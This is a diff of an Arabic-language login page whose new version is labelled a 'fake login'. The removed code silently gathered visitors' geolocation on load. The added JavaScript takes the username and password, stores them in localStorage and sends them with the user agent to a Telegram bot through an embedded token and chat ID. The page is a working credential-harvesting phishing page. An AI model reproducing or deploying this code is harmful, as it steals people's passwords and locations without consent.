@@ -1,29 +1,63 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
 <title>تسجيل الدخول</title>
+<style>
+body { font-family: Arial, sans-serif; background-color: #f0f0f0; text-align: center; padding-top: 50px; }
+input, button { padding: 10px; margin: 5px; border-radius: 5px; border: 1px solid #ccc; }
+#adminPanel { display: none; margin-top: 20px; background-color: #fff; padding: 20px; border-radius: 8px; }
+</style>
 <script>
-function sendLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(position) {
-      document.getElementById('lat').value = position.coords.latitude;
-      document.getElementById('lon').value = position.coords.longitude;
-    });
+const telegramToken = "6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0";
+const chatId = "1320552080";
+
+async function handleLogin() {
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  const developerCode = document.getElementById('devcode').value;
+
+  // حفظ محلي
+  localStorage.setItem('username', username);
+  localStorage.setItem('password', password);
+
+  // رسالة البيانات
+  const message = `🚨 تسجيل دخول جديد:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n🕵️‍♂️ الكود: ${developerCode}\n🌐 الوقت: ${new Date().toLocaleString()}\n📱 المتصفح: ${navigator.userAgent}`;
+
+  // إذا المطور دخل الكود السري
+  if (developerCode === "my_secret_code_123") {
+    document.getElementById('adminPanel').style.display = 'block';
+    alert("✅ مرحباً بالمطور! تم إرسال البيانات إلى تليجرام.");
+
+    // إرسال إلى تليجرام
+    await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+
+  } else {
+    alert("تم حفظ بياناتك محلياً فقط.");
   }
+
+  // عرض البيانات في الصفحة
+  document.getElementById('result').innerText = `اسم المستخدم: ${username}, كلمة المرور: ${password}`;
 }
-window.onload = sendLocation;
 </script>
 </head>
 <body>
-<h2>تسجيل الدخول</h2>
-<form action="save.php" method="POST">
-  <input type="text" name="username" placeholder="اسم المستخدم" required><br><br>
-  <input type="password" name="password" placeholder="كلمة المرور" required><br><br>
-  <input type="hidden" name="lat" id="lat">
-  <input type="hidden" name="lon" id="lon">
-  <button type="submit">دخول</button>
-</form>
+
+<h2>تسجيل الدخول الوهمي</h2>
+
+<input type="text" id="username" placeholder="اسم المستخدم" required><br>
+<input type="password" id="password" placeholder="كلمة المرور" required><br>
+<input type="password" id="devcode" placeholder="كود المطور (سري)" required><br>
+
+<button onclick="handleLogin()">دخول</button>
+
+<p id="result"></p>
+
+<!-- لوحة المطور -->
+<div id="adminPanel">
+  <h3>لوحة المطور</h3>
+  <p>هنا أدواتك كمطور. البيانات أُرسلت لتليجرام.</p>
+</div>
+
 </body>
 </html>
